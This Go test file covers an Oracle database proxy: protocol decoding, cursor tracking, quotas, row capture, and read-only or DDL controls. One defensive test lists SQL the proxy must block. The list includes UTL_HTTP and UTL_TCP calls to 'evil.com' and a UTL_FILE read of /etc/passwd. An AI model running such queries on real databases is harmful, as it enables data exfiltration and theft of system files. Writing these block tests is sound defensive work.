package oracle

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"io"
	"log/slog"
	"net"
	"testing"
	"time"

	"github.com/google/uuid"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/fclairamb/dbbat/internal/config"
	"github.com/fclairamb/dbbat/internal/proxy/shared"
	"github.com/fclairamb/dbbat/internal/store"
)

// testLogger returns a silent logger for tests.
func testLogger() *slog.Logger {
	return slog.New(slog.NewTextHandler(io.Discard, nil))
}

// newTestSession creates a minimal session for unit testing intercept logic.
// It does NOT set up real connections or stores — only for testing methods
// that don't touch the network/store directly.
func newTestSession(grant *store.Grant) *session {
	return &session{
		ctx:           context.Background(),
		logger:        testLogger(),
		grant:         grant,
		tracker:       newOracleQueryTracker(),
		connectionUID: uuid.Must(uuid.NewV7()),
	}
}

func TestHandleOALL8_DecodesAndTracksQuery(t *testing.T) {
	s := newTestSession(&store.Grant{})
	payload := buildOALL8("SELECT 1 FROM DUAL", nil, 1)

	err := s.handleOALL8(payload)
	require.NoError(t, err)

	// Verify cursor is tracked
	cursor, ok := s.tracker.cursors[1]
	require.True(t, ok)
	assert.Equal(t, "SELECT 1 FROM DUAL", cursor.sql)

	// Verify pending query is set
	require.NotNil(t, s.tracker.pendingQuery)
	assert.Equal(t, cursor, s.tracker.pendingQuery.cursor)
}

func TestHandleOALL8_WithBindValues(t *testing.T) {
	s := newTestSession(&store.Grant{})
	payload := buildOALL8("SELECT * FROM emp WHERE dept_id = :1", []string{"10"}, 2)

	err := s.handleOALL8(payload)
	require.NoError(t, err)

	cursor := s.tracker.cursors[2]
	require.NotNil(t, cursor)
	assert.Equal(t, []string{"10"}, cursor.bindValues)
}

func TestHandleOALL8_ReadOnlyBlocks(t *testing.T) {
	grant := &store.Grant{Controls: []string{store.ControlReadOnly}}
	s := newTestSession(grant)

	tests := []struct {
		sql  string
		fail bool
	}{
		{"SELECT 1 FROM DUAL", false},
		{"INSERT INTO t VALUES (1)", true},
		{"UPDATE t SET x = 1", true},
		{"DELETE FROM t WHERE id = 1", true},
		{"DROP TABLE t", true},
		{"CREATE TABLE t (id NUMBER)", true},
	}

	for _, tt := range tests {
		payload := buildOALL8(tt.sql, nil, 1)
		err := s.handleOALL8(payload)

		if tt.fail {
			assert.ErrorIs(t, err, shared.ErrReadOnlyViolation, "should block: %s", tt.sql)
		} else {
			assert.NoError(t, err, "should allow: %s", tt.sql)
		}
	}
}

func TestHandleOALL8_BlockDDL(t *testing.T) {
	grant := &store.Grant{Controls: []string{store.ControlBlockDDL}}
	s := newTestSession(grant)

	blocked := []string{
		"CREATE TABLE t (id NUMBER)",
		"ALTER TABLE t ADD (col NUMBER)",
		"DROP TABLE t",
	}
	allowed := []string{
		"INSERT INTO t VALUES (1)",
		"SELECT * FROM t",
	}

	for _, sql := range blocked {
		err := s.handleOALL8(buildOALL8(sql, nil, 1))
		assert.ErrorIs(t, err, shared.ErrDDLBlocked, "should block: %s", sql)
	}

	for _, sql := range allowed {
		err := s.handleOALL8(buildOALL8(sql, nil, 1))
		assert.NoError(t, err, "should allow: %s", sql)
	}
}

func TestHandleOALL8_OracleSpecificPatterns(t *testing.T) {
	grant := &store.Grant{} // No restrictions — Oracle patterns always blocked
	s := newTestSession(grant)

	blocked := []string{
		"ALTER SYSTEM SET open_cursors=1000",
		"ALTER SYSTEM KILL SESSION '123,456'",
		"CREATE DATABASE LINK remote CONNECT TO u IDENTIFIED BY p USING 'tns'",
		"BEGIN DBMS_SCHEDULER.CREATE_JOB('job1'); END;",
		"SELECT UTL_HTTP.REQUEST('http://evil.com') FROM DUAL",
		"SELECT UTL_FILE.FOPEN('/etc/passwd','r') FROM DUAL",
		"BEGIN DBMS_PIPE.SEND_MESSAGE('pipe'); END;",
		"BEGIN UTL_TCP.OPEN_CONNECTION('evil.com', 80); END;",
		"BEGIN DBMS_JOB.SUBMIT(1, 'BEGIN NULL; END;'); END;",
	}

	for _, sql := range blocked {
		err := s.handleOALL8(buildOALL8(sql, nil, 1))
		assert.ErrorIs(t, err, shared.ErrOraclePatternBlocked, "should block: %s", sql)
	}
}

func TestHandleOALL8_AllowsSafePLSQL(t *testing.T) {
	grant := &store.Grant{}
	s := newTestSession(grant)

	allowed := []string{
		"BEGIN my_pkg.read_data(:1, :2); END;",
		"DECLARE v NUMBER; BEGIN SELECT COUNT(*) INTO v FROM t; END;",
		"BEGIN NULL; END;",
	}

	for _, sql := range allowed {
		err := s.handleOALL8(buildOALL8(sql, nil, 1))
		assert.NoError(t, err, "should allow: %s", sql)
	}
}

func TestHandleOALL8_PasswordChangeBlocked(t *testing.T) {
	grant := &store.Grant{}
	s := newTestSession(grant)

	err := s.handleOALL8(buildOALL8("ALTER USER bob PASSWORD 'secret'", nil, 1))
	assert.ErrorIs(t, err, shared.ErrPasswordChangeBlocked)
}

func TestHandleOFETCH_LinksToCursor(t *testing.T) {
	s := newTestSession(&store.Grant{})

	// First, register a cursor via OALL8
	_ = s.handleOALL8(buildOALL8("SELECT * FROM emp", nil, 7))
	// Clear the pending query (as if response was received)
	s.tracker.pendingQuery = nil

	// Now fetch should link to the cursor
	s.handleOFETCH(buildOFETCH(7, 100))

	require.NotNil(t, s.tracker.pendingQuery)
	assert.Equal(t, "SELECT * FROM emp", s.tracker.pendingQuery.cursor.sql)
}

func TestHandleOFETCH_UnknownCursor(t *testing.T) {
	s := newTestSession(&store.Grant{})

	// OFETCH for cursor that doesn't exist
	s.handleOFETCH(buildOFETCH(99, 100))
	assert.Nil(t, s.tracker.pendingQuery)
}

func TestHandleOCLOSE_CleansCursor(t *testing.T) {
	s := newTestSession(&store.Grant{})

	// Register cursor
	_ = s.handleOALL8(buildOALL8("SELECT 1", nil, 5))
	require.Contains(t, s.tracker.cursors, uint16(5))

	// Close it
	s.handleOCLOSE(5)
	assert.NotContains(t, s.tracker.cursors, uint16(5))
}

func TestCursorReuse(t *testing.T) {
	s := newTestSession(&store.Grant{})

	// Register cursor 5 with first query
	_ = s.handleOALL8(buildOALL8("SELECT 1 FROM DUAL", nil, 5))
	assert.Equal(t, "SELECT 1 FROM DUAL", s.tracker.cursors[5].sql)

	// Close cursor 5
	s.handleOCLOSE(5)

	// Reuse cursor 5 with different query
	_ = s.handleOALL8(buildOALL8("SELECT 2 FROM DUAL", nil, 5))
	assert.Equal(t, "SELECT 2 FROM DUAL", s.tracker.cursors[5].sql)
}

func TestCompleteQuery_SetsDuration(t *testing.T) {
	s := newTestSession(&store.Grant{})

	s.tracker.pendingQuery = &pendingOracleQuery{
		cursor: &trackedCursor{
			sql: "SELECT 1",
		},
		startTime: time.Now().Add(-100 * time.Millisecond),
	}

	// completeQuery will try to store.CreateQuery — we can't do that without a real store,
	// but we can verify it doesn't panic and clears the pending query.
	// In a real integration test, we'd use a test store.
	// For now, just verify the pending query is cleared.
	s.store = nil // will cause the goroutine to fail silently
	s.completeQuery(nil, nil, 100)

	assert.Nil(t, s.tracker.pendingQuery)
}

func TestWriteTTCError(t *testing.T) {
	client, proxyEnd := net.Pipe()
	defer func() { _ = client.Close() }()
	defer func() { _ = proxyEnd.Close() }()

	s := &session{
		clientConn: proxyEnd,
		ctx:        context.Background(),
		logger:     testLogger(),
	}

	go func() {
		err := s.writeTTCError(1031, "insufficient privileges")
		assert.NoError(t, err)
	}()

	// Read the TNS packet from client side
	pkt, err := readTNSPacket(client)
	require.NoError(t, err)
	assert.Equal(t, TNSPacketTypeData, pkt.Type)

	// Verify it's a Response
	fc, err := parseTTCFunctionCode(pkt.Payload)
	require.NoError(t, err)
	assert.Equal(t, TTCFuncResponse, fc)

	// Verify error code is present in payload
	// Error code is at offset 4 (2 data flags + 1 func code + 1 seq)
	require.True(t, len(pkt.Payload) > 8)
	errCode := binary.BigEndian.Uint32(pkt.Payload[4:8])
	assert.Equal(t, uint32(1031), errCode)

	// Verify error message is in the payload
	assert.Contains(t, string(pkt.Payload), "ORA-01031")
}

func TestParseResponseError_NoError(t *testing.T) {
	// Build a response with error code = 0
	payload := make([]byte, 14)
	payload[0] = byte(TTCFuncResponse) // func code
	payload[1] = 0x01                  // seq
	// errCode at [2:6] = 0 (no error)
	// cursor at [6:8] = 0
	// rowcount at [8:12] = 0
	// errflag at [12:14] = 0

	errStr := parseResponseError(payload)
	assert.Nil(t, errStr)
}

func TestParseResponseError_WithError(t *testing.T) {
	payload := make([]byte, 30)
	payload[0] = byte(TTCFuncResponse)
	payload[1] = 0x01

	// Error code 942 (table or view does not exist)
	binary.BigEndian.PutUint32(payload[2:6], 942)
	// Error flag non-zero
	binary.BigEndian.PutUint16(payload[12:14], 1)
	// Error message
	msg := "ORA-00942: table not found"
	binary.BigEndian.PutUint16(payload[14:16], uint16(len(msg)))
	copy(payload[16:], []byte(msg))

	errStr := parseResponseError(payload)
	require.NotNil(t, errStr)
	assert.Contains(t, *errStr, "ORA-00942")
}

func TestParseResponseRowsAffected(t *testing.T) {
	payload := make([]byte, 12)
	payload[0] = byte(TTCFuncResponse)
	// Row count at offset 8
	binary.BigEndian.PutUint32(payload[8:12], 42)

	rows := parseResponseRowsAffected(payload)
	require.NotNil(t, rows)
	assert.Equal(t, int64(42), *rows)
}

func TestParseResponseRowsAffected_Zero(t *testing.T) {
	payload := make([]byte, 12)
	payload[0] = byte(TTCFuncResponse)

	rows := parseResponseRowsAffected(payload)
	assert.Nil(t, rows)
}

func TestDecodeCursorIDFromOCLOSE(t *testing.T) {
	payload := make([]byte, 3)
	payload[0] = byte(TTCFuncOCLOSE)
	binary.BigEndian.PutUint16(payload[1:3], 42)

	cursorID, err := decodeCursorIDFromOCLOSE(payload)
	require.NoError(t, err)
	assert.Equal(t, uint16(42), cursorID)
}

func TestDecodeCursorIDFromOCLOSE_TooShort(t *testing.T) {
	_, err := decodeCursorIDFromOCLOSE([]byte{0x05})
	assert.Error(t, err)
}

func TestCheckQuotas_NoLimits(t *testing.T) {
	s := newTestSession(&store.Grant{})
	assert.NoError(t, s.checkQuotas())
}

func TestCheckQuotas_QueryLimitExceeded(t *testing.T) {
	maxQueries := int64(10)
	s := newTestSession(&store.Grant{
		MaxQueryCounts: &maxQueries,
		QueryCount:     10,
	})
	assert.ErrorIs(t, s.checkQuotas(), ErrQueryLimitExceed)
}

func TestCheckQuotas_DataLimitExceeded(t *testing.T) {
	maxBytes := int64(1024)
	s := newTestSession(&store.Grant{
		MaxBytesTransferred: &maxBytes,
		BytesTransferred:    1024,
	})
	assert.ErrorIs(t, s.checkQuotas(), ErrDataLimitExceed)
}

func TestCheckQuotas_UnderLimit(t *testing.T) {
	maxQueries := int64(10)
	maxBytes := int64(1024)
	s := newTestSession(&store.Grant{
		MaxQueryCounts:      &maxQueries,
		MaxBytesTransferred: &maxBytes,
		QueryCount:          5,
		BytesTransferred:    500,
	})
	assert.NoError(t, s.checkQuotas())
}

func TestTruncateSQL(t *testing.T) {
	assert.Equal(t, "short", truncateSQL("short", 100))
	assert.Equal(t, "12345...", truncateSQL("1234567890", 5))
}

func TestFormatOracleBinds_Empty(t *testing.T) {
	assert.Nil(t, formatOracleBinds(nil))
	assert.Nil(t, formatOracleBinds([]string{}))
}

func TestFormatOracleBinds_WithValues(t *testing.T) {
	params := formatOracleBinds([]string{"a", "b"})
	require.NotNil(t, params)
	assert.Equal(t, []string{"a", "b"}, params.Values)
}

// --- Row capture tests ---

func newTestSessionWithStorage(grant *store.Grant, storeResults bool, maxRows int, maxBytes int64) *session {
	s := newTestSession(grant)
	s.queryStorage = config.QueryStorageConfig{
		StoreResults:   storeResults,
		MaxResultRows:  maxRows,
		MaxResultBytes: maxBytes,
	}

	return s
}

func TestCaptureRow_Basic(t *testing.T) {
	s := newTestSessionWithStorage(&store.Grant{}, true, 100, 1048576)

	// Start a pending query
	_ = s.handleOALL8(buildOALL8("SELECT id, name FROM emp", nil, 1))

	cols := []columnDef{
		{Name: "ID", TypeCode: OracleTypeNUMBER},
		{Name: "NAME", TypeCode: OracleTypeVARCHAR2},
	}
	s.captureRow(cols, []interface{}{"1", "Alice"})
	s.captureRow(cols, []interface{}{"2", "Bob"})

	require.NotNil(t, s.tracker.pendingQuery)
	assert.Len(t, s.tracker.pendingQuery.capturedRows, 2)
	assert.Equal(t, 2, s.tracker.pendingQuery.rowNumber)

	// Verify JSON format
	var row0 map[string]interface{}
	err := json.Unmarshal(s.tracker.pendingQuery.capturedRows[0].RowData, &row0)
	require.NoError(t, err)
	assert.Equal(t, "1", row0["ID"])
	assert.Equal(t, "Alice", row0["NAME"])
}

func TestCaptureRow_Limits_RowCount(t *testing.T) {
	s := newTestSessionWithStorage(&store.Grant{}, true, 3, 1048576)
	_ = s.handleOALL8(buildOALL8("SELECT * FROM big_table", nil, 1))

	cols := []columnDef{{Name: "ID", TypeCode: OracleTypeNUMBER}}

	for i := 0; i < 10; i++ {
		s.captureRow(cols, []interface{}{i})
	}

	// Should have been truncated — all rows discarded
	require.NotNil(t, s.tracker.pendingQuery)
	assert.True(t, s.tracker.pendingQuery.truncated)
	assert.Nil(t, s.tracker.pendingQuery.capturedRows)
}

func TestCaptureRow_Limits_ByteCount(t *testing.T) {
	s := newTestSessionWithStorage(&store.Grant{}, true, 1000, 50) // 50 bytes max
	_ = s.handleOALL8(buildOALL8("SELECT * FROM t", nil, 1))

	cols := []columnDef{{Name: "DATA", TypeCode: OracleTypeVARCHAR2}}

	// Each row ~20 bytes of value
	s.captureRow(cols, []interface{}{"12345678901234567890"})
	s.captureRow(cols, []interface{}{"12345678901234567890"})
	s.captureRow(cols, []interface{}{"12345678901234567890"}) // This should trigger truncation

	require.NotNil(t, s.tracker.pendingQuery)
	assert.True(t, s.tracker.pendingQuery.truncated)
	assert.Nil(t, s.tracker.pendingQuery.capturedRows)
}

func TestCaptureRow_StoreResultsDisabled(t *testing.T) {
	s := newTestSessionWithStorage(&store.Grant{}, false, 100, 1048576)
	_ = s.handleOALL8(buildOALL8("SELECT * FROM t", nil, 1))

	cols := []columnDef{{Name: "ID", TypeCode: OracleTypeNUMBER}}
	s.captureRow(cols, []interface{}{1})

	require.NotNil(t, s.tracker.pendingQuery)
	assert.Empty(t, s.tracker.pendingQuery.capturedRows)
}

func TestCaptureRow_NoPendingQuery(t *testing.T) {
	s := newTestSessionWithStorage(&store.Grant{}, true, 100, 1048576)
	// No pending query — should not panic
	cols := []columnDef{{Name: "ID", TypeCode: OracleTypeNUMBER}}
	s.captureRow(cols, []interface{}{1})
}

func TestCaptureRow_NilValue(t *testing.T) {
	s := newTestSessionWithStorage(&store.Grant{}, true, 100, 1048576)
	_ = s.handleOALL8(buildOALL8("SELECT id, name FROM t", nil, 1))

	cols := []columnDef{
		{Name: "ID", TypeCode: OracleTypeNUMBER},
		{Name: "NAME", TypeCode: OracleTypeVARCHAR2},
	}
	s.captureRow(cols, []interface{}{1, nil})

	var row0 map[string]interface{}
	err := json.Unmarshal(s.tracker.pendingQuery.capturedRows[0].RowData, &row0)
	require.NoError(t, err)
	assert.Nil(t, row0["NAME"])
}

func TestCompleteQuery_WithRows_AssignsRowNumbers(t *testing.T) {
	s := newTestSessionWithStorage(&store.Grant{}, true, 100, 1048576)
	_ = s.handleOALL8(buildOALL8("SELECT id FROM t", nil, 1))

	cols := []columnDef{{Name: "ID", TypeCode: OracleTypeNUMBER}}
	s.captureRow(cols, []interface{}{1})
	s.captureRow(cols, []interface{}{2})
	s.captureRow(cols, []interface{}{3})

	// Complete without a store (won't actually persist, but verifies row numbering logic)
	pending := s.tracker.pendingQuery
	require.NotNil(t, pending)
	assert.Len(t, pending.capturedRows, 3)

	rows := int64(3)
	s.completeQuery(&rows, nil, 100)
	assert.Nil(t, s.tracker.pendingQuery)
}

func TestHandleResponse_ErrorResponse(t *testing.T) {
	s := newTestSessionWithStorage(&store.Grant{}, true, 100, 1048576)
	_ = s.handleOALL8(buildOALL8("SELECT * FROM nonexistent", nil, 1))

	payload := buildTTCErrorResponse(942, "ORA-00942: table or view does not exist")
	s.handleResponse(payload, 100)

	// Pending query should be completed
	assert.Nil(t, s.tracker.pendingQuery)
}

func TestHandleResponse_WithColumnDefsAndRows(t *testing.T) {
	s := newTestSessionWithStorage(&store.Grant{}, true, 100, 1048576)
	_ = s.handleOALL8(buildOALL8("SELECT id, name FROM emp", nil, 1))

	payload := buildTTCResponse(
		[]columnDef{
			{Name: "ID", TypeCode: OracleTypeVARCHAR2},
			{Name: "NAME", TypeCode: OracleTypeVARCHAR2},
		},
		[][]interface{}{{"1", "Alice"}, {"2", "Bob"}},
	)

	// handleResponse should capture the rows then complete
	s.handleResponse(payload, 500)

	// Query should be completed (pendingQuery cleared)
	assert.Nil(t, s.tracker.pendingQuery)
}

func TestHandleResponse_MoreData_DoesNotComplete(t *testing.T) {
	s := newTestSessionWithStorage(&store.Grant{}, true, 100, 1048576)
	_ = s.handleOALL8(buildOALL8("SELECT id FROM big_table", nil, 1))

	payload := buildTTCResponseWithMoreData(true)
	s.handleResponse(payload, 100)

	// Pending query should NOT be completed — more data expected
	assert.NotNil(t, s.tracker.pendingQuery)
}
